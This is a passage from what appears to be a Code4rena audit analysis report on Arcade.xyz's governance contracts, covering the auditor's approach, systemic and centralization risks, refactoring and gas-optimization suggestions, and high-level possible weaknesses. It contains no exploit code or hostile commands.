possible systemic risks based on my analysis</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\">Code Commentary</td>\n<td align=\"left\">Suggestions for existing code base</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\">Centralization risks</td>\n<td align=\"left\">Concerns associated with centralized systems</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\">Gas Optimizations</td>\n<td align=\"left\">Details about my gas optimizations findings and gas savings</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\">Possible Risks as per my analysis</td>\n<td align=\"left\">Possible risks</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\">Time spent on analysis</td>\n<td align=\"left\">The overall time spent for this report</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"overview-of-arcadexyz-platform\" style=\"position:relative;\"><a href=\"#overview-of-arcadexyz-platform\" aria-label=\"overview of arcadexyz platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview of Arcade.xyz platform</h2>\n<p>Arcade.xyz is a platform for autonomous borrowing, lending, and escrow of NFT collateral on EVM blockchains. This governance system is built on the <code>Council Framework</code>.</p>\n<p>Arcade governance is classified into 4 types: </p>\n<ul>\n<li><code>Voting Vaults</code>: Each voting vault contract is a separate deployment, which handles its deposits and vote-counting mechanisms for those deposits.</li>\n<li><code>Core Voting</code>: These contracts can be used to submit and vote on proposed governance transactions. Core voting contracts may either administrate the protocol directly or may be intermediated by a <code>Timelock</code> contract.</li>\n<li><code>Token</code>: The ERC20 governance token, along with contracts required for initial deployment and distribution of the token (airdrop contract, initial distributor contract).</li>\n<li><code>NFT</code>: The ERC1155 token contract along with its <code>tokenURI</code> descriptor contract. The ERC1155 token is used in governance to give a multiplier to a user’s voting power.\n</li>\n</ul>\n<h3 id=\"my-thoughts\" style=\"position:relative;\"><a href=\"#my-thoughts\" aria-label=\"my thoughts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>My Thoughts</h3>\n<p>Arcade.xyz is a platform to change the future in the following areas:</p>\n<ul>\n<li>It provides a way for users to have a say in how the protocol is governed. This is important because it gives users more control over their assets and ensures that the protocol is aligned with their interests.</li>\n<li>The Arcade governance system is designed to be scalable. This means that it can be used to govern large and complex DeFi protocols. This is important because it will allow DeFi protocols to grow and evolve without sacrificing decentralization.</li>\n<li>The Arcade governance system is secure. This is because it is built on the Council Framework, which is a battle-tested governance system. This means that the Arcade governance system is less likely to be exploited by malicious actors</li>\n</ul>\n<h3 id=\"audit-approach\" style=\"position:relative;\"><a href=\"#audit-approach\" aria-label=\"audit approach permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit approach</h3>\n<p>I followed the steps below while analyzing and auditing the code base:</p>\n<ol>\n<li>\n<p>Read the audit Readme.md and took the required notes.</p>\n<ul>\n<li>Arcade.xyz platform uses </li>\n<li>Inheritance</li>\n<li>NFT</li>\n<li>Timelock Functions</li>\n<li>ERC20</li>\n<li>The test coverage is 99%</li>\n</ul>\n</li>\n<li>Analyzed the overall codebase on iterations very fast.</li>\n<li>Study of documentation to understand each contract’s purpose, its functionality, how it is connected with other contracts, etc.</li>\n<li>Then I read old audits and known findings. Then went through the bot race findings.</li>\n<li>Then I setup my testing environment things. Run the tests to checks all test passed.</li>\n<li>Finally, I started with auditing the codebase in-depth. I started understanding the code line by line and took the necessary notes to ask some questions to sponsors.</li>\n</ol>\n<h3 id=\"stages-of-audit\" style=\"position:relative;\"><a href=\"#stages-of-audit\" aria-label=\"stages of audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stages of audit</h3>\n<ul>\n<li><code>The first stage of the audit</code>: During the initial stage of the audit for the Arcade.xyz platform, the primary focus was on analyzing gas usage and quality assurance (QA) aspects. This phase of the audit aimed to ensure the efficiency of gas consumption and verify the robustness of the platform.</li>\n<li><code>The second stage of the audit</code>: In the second stage of the audit for the Arcade.xyz platform, the focus shifted towards understanding the protocol usage in more detail. This involved identifying and analyzing the important contracts and functions within the system. By examining these key components of the audit, I aimed to gain a comprehensive understanding of the protocol’s functionality and potential risks. </li>\n<li><code>The third stage of the audit</code>: During the third stage of the audit for the Arcade.xyz platform, the focus was on thoroughly examining and marking any doubtful or vulnerable areas within the protocol. This stage involved conducting comprehensive vulnerability assessments and identifying potential weaknesses in the system. Found <code>60-70</code>, <code>vulnerable</code>, and <code>weakness</code> code parts all marked with <code>@audit tags</code>.</li>\n<li><code>The fourth stage of the audit</code>: During the fourth stage of the audit for the Arcade.xyz platform, a comprehensive analysis and testing of the previously identified doubtful and vulnerable areas were conducted. This stage involved diving deeper into these areas, performing in-depth examinations, and subjecting them to rigorous testing; including fuzzing with various inputs. Finally concluded findings after all research and tests. Then I reported to C4 with proper formats. </li>\n</ul>\n<h3 id=\"learnings\" style=\"position:relative;\"><a href=\"#learnings\" aria-label=\"learnings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Learnings</h3>\n<p>Arcade.xyz’s governance system, we can understand several key learnings:</p>\n<ul>\n<li><code>Decentralized Governance</code>: Arcade.xyz allows token holders to vote on platform decisions, ensuring that no single entity or group has complete control. It’s a democratic way of making choices for the platform.</li>\n<li><code>Voting Vaults and Delegation</code>: Users can deposit their voting tokens in separate vaults and also delegate their voting power to someone they trust, making it easier for more people to participate in voting.</li>\n<li><code>ERC20 and ERC1155 Tokens</code>: Arcade.xyz uses two types of tokens - ERC20 for basic voting and ERC1155 for more advanced governance features, like giving some tokens more voting influence.</li>\n<li><code>Council Framework</code>: The governance system follows a specific Council Framework, which outlines rules and guidelines for how decisions are made.</li>\n<li><code>Protocol Administrations and Timelock</code>: Proposals can directly impact the platform or go through a <code>Timelock</code> first, adding a delay to allow community review and transparency.</li>\n<li><code>Autonomy and Smart Contracts</code>: Once set up, the governance system operates autonomously using smart contracts, without needing central control.</li>\n<li><code>Transparency and Openness</code>: Arcade.xyz is transparent about how things work, providing clear technical details for users to understand and participate effectively.</li>\n<li><code>NFT Integration</code>: Non-fungible tokens (NFTs) can enhance voting power, incentivizing community involvement and participation.</li>\n</ul>\n<h3 id=\"possible-systemic-risks\" style=\"position:relative;\"><a href=\"#possible-systemic-risks\" aria-label=\"possible systemic risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Systemic Risks</h3>\n<ul>\n<li><strong>Centralization Risk</strong>: Voting power could concentrate among a few, leading to centralization.</li>\n<li><strong>Delegate Control Concerns</strong>: Delegation may reduce voter engagement and representativeness.</li>\n<li><strong>Low Participation</strong>: Low turnout may undermine governance legitimacy.</li>\n<li><strong>Ineffective Proposals</strong>: Poorly designed proposals may hinder progress.</li>\n<li><strong>Voting Manipulation</strong>: Malicious actors may try to influence outcomes.</li>\n<li><strong>Token Concentration</strong>: Unequal token distribution may skew decisions.</li>\n<li><strong>NFT Impact Uncertainty</strong>: ERC1155 NFTs’ effects may have unintended consequences.</li>\n<li><strong>Technical Vulnerabilities</strong>: Smart contract bugs could compromise governance.</li>\n<li><strong>Community Disagreements</strong>: Conflicts may impede decision-making.</li>\n<li><strong>Governance Rule Updates</strong>: Changing rules may be challenging and require consensus.</li>\n</ul>\n<h3 id=\"code-commentary\" style=\"position:relative;\"><a href=\"#code-commentary\" aria-label=\"code commentary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Commentary</h3>\n<ul>\n<li>Instead of using bytes32 constants for role identifiers, consider using an enum for better readability and code organization.</li>\n<li>Functions like <code>smallSpend</code>, <code>mediumSpend</code>, and <code>largeSpend</code> have similar logic. Consider refactoring the code to combine the common logic into a single internal function and call it from each respective function. This can reduce code duplication.</li>\n<li>For events like <code>TreasuryTransfer</code> and <code>TreasuryApproval</code>, consider emitting only relevant data instead of emitting the entire amount and destination/spender.</li>\n<li>The “immutable” variable should be in upper case.</li>\n<li>Instead of using error messages in revert statements, consider using an enum to define error codes. This can make error handling more structured and easier to understand.</li>\n<li>Ensure that error messages are clear and informative to help developers and users understand contract behavior and potential issues.</li>\n<li>The contract could benefit from more detailed comments and documentation to explain the purpose of various functions, their expected behavior, and any potential risks or constraints. This would make it easier for developers to understand and interact with the contract.</li>\n<li>Consider reordering the modifiers in the function declarations to improve readability. For example, move the <code>onlyManager</code> modifier to be the last one, as it’s the most specific and should be applied after other access control checks.</li>\n<li>Consider using a struct to represent grant data instead of individual storage variables. This can make the code cleaner and easier to manage.</li>\n<li>Instead of importing the entire ERC20 contract, consider using an ERC20 interface with only the necessary functions. This helps to reduce contract deployment costs.</li>\n<li>The contract uses a mix of <code>camelCase</code> and <code>snake_case</code> for function and variable names. It’s advisable to use a consistent naming convention throughout the contract to enhance readability.</li>\n<li>There are some duplicated code segments (e.g., handling delegation and voting power updates) that could be abstracted into separate helper functions to improve code readability and maintainability.</li>\n<li>While the contract has some comments, additional documentation could be provided to clarify the purpose and behavior of certain functions and variables.</li>\n<li>In functions where multiple events are emitted, consider consolidating them into a single emit statement for better gas efficiency.</li>\n</ul>\n<h3 id=\"centralization-risks\" style=\"position:relative;\"><a href=\"#centralization-risks\" aria-label=\"centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Centralization risks</h3>\n<p>A single point of failure is not acceptable for this project. Centrality risk is high in the project, the role of <code>onlyOwner</code> detailed below has very critical and important powers.</p>\n<p>Project and funds may be compromised by a malicious or stolen private key <code>onlyOwner</code> <code>msg.sender</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BadgeDescriptor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBaseURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newBaseURI</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/BadgeDescriptor.sol#L57\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/BadgeDescriptor.sol#L57</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">token</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ArcadeAirdrop</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reclaim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destination</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMerkleRoot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_merkleRoot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol#L62\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol#L62</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">token</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ArcadeTokenDistributor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_treasury</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toDevPartner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_devPartner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toCommunityRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_communityRewards</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toCommunityAirdrop</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_communityAirdrop</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toTeamVesting</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_vestingTeam</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toPartnerVesting</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_vestingPartner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IArcadeToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arcadeToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeTokenDistributor.sol#L73\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeTokenDistributor.sol#L73</a></p>\n<h3 id=\"gas-optimizations-1\" style=\"position:relative;\"><a href=\"#gas-optimizations-1\" aria-label=\"gas optimizations 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h3>\n<p>During the audit of the smart contracts on <code>Arcade.xyz's</code> governance platform, several key gas optimization issues were identified. These issues could potentially lead to increased transaction costs and inefficiencies on the Ethereum network. One of the notable findings was related to state variables, where it was observed that they can be packed together to utilize fewer storage slots. By organizing related variables in this way, the number of storage operations, such as <code>SSTORE</code> and <code>SLOAD</code> opcodes, can be reduced, resulting in significant gas savings.</p>\n<p>Another prevalent optimization opportunity involved caching state variables in stack variables instead of repeatedly re-reading them from storage. This approach can eliminate redundant storage operations, leading to improved gas efficiency. Utilizing opcodes like <code>SWAP</code>, <code>DUP</code>, and <code>MLOAD</code> efficiently allows for cost-effective access to state variables during contract execution.</p>\n<p>In addition, a gas-saving technique was found in arithmetic operations on state variables. It was observed that using the <code>=</code> operator rather than <code>+=</code> and <code>-=</code> could result in reduced gas consumption for the <code>ADD</code>, <code>SUB</code>, and <code>MSTORE</code> opcodes. Moving <code>IF</code> statements or <code>require()</code> functions that check input arguments to the top of the functions was another recommendation to avoid unnecessary code execution; thereby, saving gas. This optimization takes advantage of the <code>JUMP</code> and <code>JUMPI</code> opcodes, which control the flow of execution within the contract.</p>\n<p>Furthermore, multiple accesses of mappings or arrays were identified as potential areas for improvement. By employing local variable caches, redundant read operations from storage can be minimized, reducing gas costs. The relevant opcodes in this context include <code>MLOAD</code>, <code>MSTORE</code>, and <code>SLOAD</code>.</p>\n<p>Moreover, it was noticed that emitting state variables when stack variables are available could lead to unnecessary gas consumption. Emitting state variables involves storage operations, while stack variables are more gas-efficient. The <code>LOG</code> opcode is used for emitting event logs.</p>\n<p>Lastly, optimizing function parameters by using <code>calldata</code> instead of <code>memory</code> can save gas. The <code>CALLDATASIZE</code> opcode is used to access the size of the input data, and <code>CALLDATALOAD</code> is used to retrieve specific function parameters from the input.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/151\">https://github.com/code-423n4/2023-07-arcade-findings/issues/151</a></p>\n<h3 id=\"possible-risks-as-per-my-analysis\" style=\"position:relative;\"><a href=\"#possible-risks-as-per-my-analysis\" aria-label=\"possible risks as per my analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Risks as per my analysis</h3>\n<ul>\n<li>The <code>batchCalls</code> function allows executing multiple low-level calls in a single transaction. If a large number of calls are included or if any of the calls fail, the entire transaction will be reverted, leading to gas wastage. This can result in higher transaction costs and failed transactions due to gas limits.</li>\n<li>The <code>smallSpend</code>, <code>mediumSpend</code>, <code>largeSpend</code>, <code>approveSmallSpend</code>, <code>approveMediumSpend</code>, and <code>approveLargeSpend</code> functions do not perform input validation to check whether the <code>amount</code> parameter exceeds the token balance or allowance. This could lead to unintended spending or approval of more tokens than the treasury holds or intends to allow.</li>\n<li>The <code>_spend</code> and <code>_approve</code> functions enforce a per-block spending/approval limit (<code>limit</code>) to avoid excessive spending. However, there is no mechanism to reset the <code>blockExpenditure</code> storage variable when a new block starts, which could lead to inconsistencies if the contract is active across multiple blocks.</li>\n<li>In the <code>_spend</code> function, if the destination is a contract without a <code>receive function</code>, the transfer will fail, resulting in a <code>loss of funds</code>. The function should include checks to handle such cases appropriately.</li>\n<li>Hardcoded <code>cooldown period</code> may cause problems in the future.</li>\n<li>Lack of same value input control in critical <code>setMinter()</code> functions.</li>\n<li>Use <code>safeInceaseAllowance()</code>/<code>safeDecreaseAllowance()</code> instead of <code>approve()</code> or deprecated <code>safeApprove()</code> functions.</li>\n<li>Don’t use <code>payable(address).tranfer()</code> to avoid unexpected fund loss.</li>\n<li>The function <code>addGrantAndDelegate</code> allows the manager to create a new grant without checking if the grant recipient already has an active grant. If a user already has an active grant, this function will overwrite the existing grant, which might lead to unintended behavior. It would be better to check if the recipient already has a grant and handle this situation accordingly.</li>\n<li>In the <code>_getWithdrawableAmount</code> function, there are multiple arithmetic calculations involving subtraction, addition, and multiplication. Ensure that these calculations do not result in underflow or overflow situations, which could lead to unintended behavior or vulnerabilities.</li>\n<li>The contract uses a custom state management system with the Storage library, which might make it harder to understand for developers not familiar with this approach. Consider using standardized storage patterns to improve code readability and maintainability.</li>\n<li>Some functions, such as <code>_lockNft</code>, <code>_lockTokens</code>, and <code>_grantVotingPower</code>, are marked as internal but are not strictly necessary to be internal. It’s essential to assess whether these functions need to be called from other contracts or external interactions.</li>\n</ul>\n<h3 id=\"time-spent-on-analysis\" style=\"position:relative;\"><a href=\"#time-spent-on-analysis\" aria-label=\"time spent on analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 